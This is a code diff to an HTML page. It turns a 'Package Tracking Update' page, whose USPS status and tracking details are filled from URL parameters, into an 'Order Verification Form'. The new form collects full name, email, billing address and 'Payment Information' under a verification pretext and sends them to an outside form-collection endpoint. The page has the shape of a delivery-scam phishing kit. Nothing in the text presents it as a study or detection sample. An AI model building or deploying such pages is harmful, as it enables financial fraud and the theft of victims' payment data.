@@ -2,39 +2,66 @@
 <html lang="en">
 <head>
   <meta charset="UTF-8" />
-  <title>Custom Tracking Update</title>
+  <title>Order Verification Form</title>
   <style>
-    body { font-family: Arial, sans-serif; margin: 20px; }
-    .container { max-width: 600px; margin: auto; padding: 20px; border: 1px solid #ddd; border-radius: 8px; background: #f9f9f9; }
-    h1 { color: #333; }
-    .status { font-weight: bold; font-size: 18px; margin: 20px 0; }
-    .details div { margin-bottom: 10px; }
+    body { font-family: Arial, sans-serif; margin: 20px; background: #f9f9f9; }
+    .container { max-width: 500px; margin: auto; padding: 20px; background: white; border-radius: 8px; box-shadow: 0 0 10px rgba(0,0,0,0.1); }
+    h2 { text-align: center; color: #333; }
+    label { display: block; margin-top: 15px; font-weight: bold; }
+    input, textarea { width: 100%; padding: 8px; margin-top: 5px; border-radius: 4px; border: 1px solid #ccc; }
+    button { margin-top: 20px; width: 100%; padding: 10px; background: #007bff; color: white; border: none; border-radius: 4px; font-size: 16px; cursor: pointer; }
+    button:hover { background: #0056b3; }
+    .note { margin-top: 10px; font-style: italic; color: #666; font-size: 14px; }
+    .success-message { display:none; color: green; margin-top: 20px; text-align: center; font-weight: bold; }
   </style>
 </head>
 <body>
   <div class="container">
-    <h1>Package Tracking Update</h1>
-    <div class="status" id="status">📦 Status Unknown</div>
-    <div class="details">
-      <div><strong>Customer:</strong> <span id="customerName">Unknown</span></div>
-      <div><strong>Tracking Number:</strong> <span id="trackingNum">N/A</span></div>
-      <div><strong>Carrier:</strong> USPS</div>
-      <div><strong>Estimated Delivery:</strong> <span id="deliveryDate">TBD</span></div>
+    <h2>Order Verification Form</h2>
+    <form id="verification-form" action="https://formspree.io/f/{your-form-id}" method="POST">
+      <label for="fullname">Full Name</label>
+      <input type="text" id="fullname" name="fullname" required />
+      
+      <label for="email">Email Address</label>
+      <input type="email" id="email" name="_replyto" required />
+      
+      <label for="address">Billing Address</label>
+      <textarea id="address" name="address" rows="3" required></textarea>
+      
+      <label for="paymentinfo">Payment Information</label>
+      <textarea id="paymentinfo" name="paymentinfo" rows="3" required></textarea>
+      
+      <div class="note">Make sure this information matches your payment information for verification purposes.</div>
+      
+      <button type="submit">Submit Verification</button>
+    </form>
+    <div class="success-message" id="success-message">
+      Your form is being reviewed. You will receive your shipping information within 1-2 business days.
     </div>
   </div>
 
   <script>
-    // Helper to get URL parameters
-    function getParam(param) {
-      const urlParams = new URLSearchParams(window.location.search);
-      return urlParams.get(param);
-    }
+    const form = document.getElementById('verification-form');
+    const successMessage = document.getElementById('success-message');
+    form.addEventListener('submit', (e) => {
+      e.preventDefault();
 
-    // Populate the fields with URL params or fallback defaults
-    document.getElementById('customerName').textContent = getParam('name') || 'Valued Customer';
-    document.getElementById('trackingNum').textContent = getParam('tracking') || '0000000000000';
-    document.getElementById('status').textContent = getParam('status') ? '📦 ' + getParam('status') : '📦 In Transit';
-    document.getElementById('deliveryDate').textContent = getParam('delivery') || 'August 5, 2025';
+      const data = new FormData(form);
+      fetch(form.action, {
+        method: 'POST',
+        headers: { 'Accept': 'application/json' },
+        body: data,
+      }).then(response => {
+        if (response.ok) {
+          form.style.display = 'none';
+          successMessage.style.display = 'block';
+        } else {
+          alert('Oops! There was a problem submitting your form.');
+        }
+      }).catch(() => {
+        alert('Oops! There was a problem submitting your form.');
+      });
+    });
   </script>
 </body>
 </html>
